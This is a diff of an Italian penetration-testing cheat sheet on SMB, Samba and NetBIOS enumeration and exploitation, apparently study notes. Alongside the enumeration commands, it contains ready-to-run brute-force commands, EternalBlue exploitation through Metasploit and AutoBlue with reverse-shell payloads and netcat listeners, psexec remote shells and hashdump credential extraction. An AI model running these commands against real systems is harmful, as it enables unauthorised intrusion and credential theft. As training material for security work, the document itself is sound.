@@ -1,8 +1,27 @@
 # SMB & Samba Enumeration & Exploitation
 
 **SMB (Server Message Block)** è un protocollo di rete utilizzato principalmente nei sistemi Windows per la condivisione di file, stampanti e altre risorse. <br>
-**Samba** è la sua implementazione libera in ambiente Linux/Unix, consentendo l’interoperabilità tra Windows e Linux. <br>
-Entrambi operano sulle porte `445/TCP` (moderno) e `139/TCP` (legacy via NetBIOS). SMB/Samba è spesso abilitato di default, rendendolo un obiettivo comune durante un penetration test.
+**Samba** è la sua implementazione libera in ambiente Linux/Unix, consentendo l’interoperabilità tra Windows e Linux. Entrambi operano sulle porte `445/TCP` (moderno, SMB Direct) e `139/TCP` (legacy, via NetBIOS). <br>
+
+Un tempo SMB e NetBIOS erano strettamente legati: SMB sfruttava il protocollo NetBIOS per funzionare. Oggi, le reti moderne utilizzano SMB su porta 445 bypassando NetBIOS, che tuttavia può essere ancora rilevante in ambienti legacy o non aggiornati. 
+
+---
+
+## NetBIOS – Architettura e Rilevanza
+
+**NetBIOS (Network Basic Input/Output System)** è un’API e set di protocolli utilizzato per consentire la comunicazione tra dispositivi in una rete locale. Offre tre principali servizi:
+
+- **Name Service (NetBIOS-NS)** – usa la porta `137` per risolvere nomi host su reti locali (in passato utilizzato al posto del DNS);
+- **Datagram Service (NetBIOS-DGS)** – usa la porta `138`, fornisce comunicazione connectionless e broadcasting per servizi tipo messaggistica;
+- **Session Service (NetBIOS-SSN)** – opera sulla porta `139`, usato per comunicazioni orientate alla connessione.
+
+Quando effettuiamo una scansione Nmap sulla porta 139, spesso il servizio restituito è proprio `netbios-ssn`, indicando l’attività di NetBIOS Session Service.
+
+Per analizzare NetBIOS possiamo usare `nbtscan`, uno scanner leggero per identificare host che pubblicano nomi NetBIOS:
+
+- `nbtscan <IP>` ⟶ scansione base per identificare nomi NetBIOS.
+- `nbtscan -r <subnet>` ⟶ scansione ricorsiva di una subnet.
+- `nbtscan -v <IP>` ⟶ output dettagliato con informazioni aggiuntive.
 
 ---
 
@@ -12,23 +31,30 @@ Per rilevare la presenza del servizio SMB/Samba e identificare la versione:
 
 `nmap -sV -p139,445 <target>` ⟶ rileva SMB sulle porte NetBIOS e SMB Direct
 
-Per ottenere maggiori informazioni:
+Script NSE utili:
 - `nmap --script smb-os-discovery <target>` ⟶ sistema operativo, dominio, NetBIOS
 - `nmap --script smb-enum-shares <target>` ⟶ condivisioni disponibili
 - `nmap --script smb-enum-users <target>` ⟶ utenti configurati
-- `nmap -p445 --script smb-vuln-ms17-010 <IP>` ⟶ verifica EternalBlue per Windows
+- `nmap -p445 --script smb-vuln-ms17-010 <IP>` ⟶ verifica EternalBlue
+- `nmap -p445 --script=smb-protocols <IP>` ⟶ protocolli supportati (NTLM, LM, SMB1/2/3)
+- `nmap -p445 --script=smb-security-mode <IP>` ⟶ modalità di sicurezza attiva (autenticazione, accessi anonimi, ecc.)
 
 Con Metasploit:
 - `use auxiliary/scanner/smb/smb_version` ⟶ verifica versione SMB
-- `use auxiliary/scanner/smb/smb_ms17_010` ⟶ verifica vulnerabilità EternalBlue per Windows
+- `use auxiliary/scanner/smb/smb_ms17_010` ⟶ verifica vulnerabilità EternalBlue
 
-Identificare la versione aiuta a cercare exploit con:
+Per cercare exploit relativi:
 `searchsploit samba <versione>`
 
 Versioni vulnerabili comuni:
 - **SMBv1** ⟶ EternalBlue (MS17-010)
 - **Windows XP/2003/7 non patchati** ⟶ buffer overflow
 - **vsrvsvc** ⟶ vulnerabilità RPC
+
+Versioni SMB:
+- **SMB 1.0** ⟶ insicuro, supporta accessi anonimi, molte vulnerabilità.
+- **SMB 2.0/2.1** ⟶ introdotti con Windows Vista e Server 2008, migliorie in sicurezza e prestazioni.
+- **SMB 3.0+** ⟶ da Windows 8 in poi, supporto crittografia, multicanale, virtualizzazione.
 
 ---
 
@@ -43,6 +69,8 @@ Client simile a FTP per connettersi e interagire con le share:
 Comandi interni:
 - `?`, `ls`, `get <file>`, `put <file>`, `cd`, `mkdir`, `rmdir`
 
+> File come `*.tar.gz` possono essere estratti con `tar xzf file.tar.gz`
+
 ### smbmap
 Consente di elencare share e permessi associati:
 - `smbmap -H <IP> -u <username> -p <password>`
@@ -53,6 +81,8 @@ Permessi comuni:
 ### enum4linux
 Strumento completo basato su `smbclient`, `rpcclient`, `nmblookup`:
 - `enum4linux -a <IP>` ⟶ utenti, share, NetBIOS, gruppi, policy
+
+> Se usato con credenziali valide, fornisce output molto più dettagliato.
 
 ### rpcclient
 Permette l’interazione con i servizi RPC via SMB:
@@ -80,13 +110,7 @@ Test:
 `hydra -L <userList> -P <passwordList> <IP> smb` ⟶ attacco SMB/Samba
 
 ### Con Metasploit
-```bash
-use auxiliary/scanner/smb/smb_login
-set RHOSTS <IP>
-set USER_FILE <user_list>
-set PASS_FILE <pass_list>
-run
-```
+`use auxiliary/scanner/smb/smb_login`<br>`set RHOSTS <IP>`<br>`set USER_FILE <user_list>`<br>`set PASS_FILE <pass_list>`<br>`run`<br>
 
 ### Con CrackMapExec
 - `crackmapexec smb <target> -u <user> -p <password>` ⟶ verifica credenziali
@@ -99,21 +123,21 @@ run
 
 ### Exploit EternalBlue (MS17-010)
 
-Con Metasploit:
-```bash
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS <IP>
-set SMBPIPE BROWSER
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST <KaliIP>
-set LPORT <Port>
-run
-```
+**EternalBlue** è una vulnerabilità critica identificata come **MS17-010** che colpisce il protocollo **SMBv1** su sistemi Windows non aggiornati (XP, 2003, 7). <br>
+Questa vulnerabilità consente l'esecuzione di codice da remoto (**RCE**) senza autenticazione, sfruttando un bug nei pacchetti SMB. <br>
+È diventata celebre in quanto utilizzata dal worm **WannaCry**. <br>
+EternalBlue è sfruttabile solo se il servizio SMBv1 è attivo e non patchato.
+
+Con Metasploit:<br>`use exploit/windows/smb/ms17_010_eternalblue`<br>`set RHOSTS <IP>`<br>`set SMBPIPE BROWSER`<br>`set PAYLOAD windows/x64/meterpreter/reverse_tcp`<br>`set LHOST <KaliIP>`<br>`set LPORT <Port>`<br>`run`<br>
 
 Una volta ottenuta la shell:
 - `getuid`, `getprivs`, `hashdump`
 
-Con <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue-MS17-010</a>:
+### AutoBlue-MS17-010
+
+**AutoBlue-MS17-010** è uno script Python che automatizza lo sfruttamento della vulnerabilità EternalBlue. <br>
+È particolarmente utile in contesti dove non si usa Metasploit o si preferisce una procedura manuale e più trasparente.
+
 ```bash
 cd AutoBlue-MS17-010/shellcode
 chmod +x shell_prep.sh
@@ -122,20 +146,14 @@ nc -nvlp 4444
 python eternalblue_exploit7.py <IP> shellcode/sc_x64.bin
 ```
 
+AutoBlue può essere utilizzato per generare shellcode, avviare listener e inviare l’exploit, e funziona efficacemente su macchine non patchate vulnerabili a MS17-010 con SMBv1 attivo.
+
 ### PsExec (Metasploit)
-```bash 
-use exploit/windows/smb/psexec
-set RHOSTS <IP>
-set SMBUser <username>
-set SMBPass <password>
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <KaliIP>
-set LPORT <Port>
-run
-```
+`use exploit/windows/smb/psexec`<br>`set RHOSTS <IP>`<br>`set SMBUser <username>`<br>`set SMBPass <password>`<br>`set PAYLOAD windows/meterpreter/reverse_tcp`<br>`set LHOST <KaliIP>`<br>`set LPORT <Port>`<br>`run`<br>
 
 ### Impacket – psexec.py
-`psexec.py <username>@<IP> cmd.exe`⟶ accesso CMD remoto via SMB <br>
+`psexec.py <username>@<IP> cmd.exe`⟶ accesso CMD remoto via SMB
+
 Percorso tipico: `/usr/share/doc/python3-impacket/examples/psexec.py`
 
 ---
